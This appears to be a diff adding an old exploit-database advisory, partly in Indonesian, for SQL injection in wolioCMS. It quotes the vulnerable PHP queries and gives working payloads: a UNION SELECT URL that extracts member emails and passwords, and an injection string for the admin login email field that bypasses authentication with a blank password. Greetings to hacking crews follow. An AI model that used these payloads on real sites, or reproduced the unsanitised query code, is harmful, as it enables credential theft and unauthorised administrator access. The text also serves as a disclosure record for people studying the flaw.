@@ -1,0 +1,45 @@
+########################################################################
+# wolioCMS - SQL Injection and Bypass Administrator Login
+# Vendor        : http://www.buton.web.id/member.php?member=anon
+# Download      : http://www.buton.web.id/download/woliocms.zip
+# Found By      : k1tk4t - k1tk4t[4t]newhack.org
+# Location      : Indonesia   --  #newhack[dot]org @irc.dal.net
+########################################################################
+Exploit ini berhasil jika 'magic_quotes_gpc = off'
+########################################################################
+file;
+/common.php
+bug at line73;
+$sql="select * from pages where pages_id='".$_GET["id"]."' ";
+----
+/admin/index.php
+bug at line28;
+$sql="select * from member where member_email='$uid' and member_password='$pwd' and member_active='yes' ";
+Variable $uid tidak terfilter dengan baik, sehingga bisa di manipulasi oleh user
+########################################################################
+exploit;
+SQL Injection
+http://localhost/_woliocms/member.php?member=admin&act=page&id='/**/UNION/**/ALL/**/SELECT/**/null,null,concat(member_email,'-',member_password),null,null,null,null,null,null,null/**/FROM/**/member/*
+----
+Bypass Administrator Login
+http://localhost/_woliocms/admin/
+Login Page
+Email;
+'/**/UNION/**/ALL/**/SELECT/**/member_id,member_email,member_password,member_realname,member_urlname,member_themes,member_groups_id,member_register_date,member_active,member_activation_code/**/FROM/**/member/*
+Password;
+Blank[just kliklogin]
+########################################################################
+Thanks;
+str0ke
+xoron [www.xoron.biz]
+y3dips [y3d1ps.blogspot.com]
+-newhack[dot]org|staff-
+mR.opt1lc,fusion,fl3xu5,PusHm0v,Ghoz,bius,iind_id,slackX
+-----------------------
+all member newhack[ot]org
+-----------------------
+all member echo.or.id
+-----------------------
+tidak lupa untuk anavrin[semangat kerja bro], dan ical yang baru sembuh
+
+# milw0rm.com [2007-07-30]
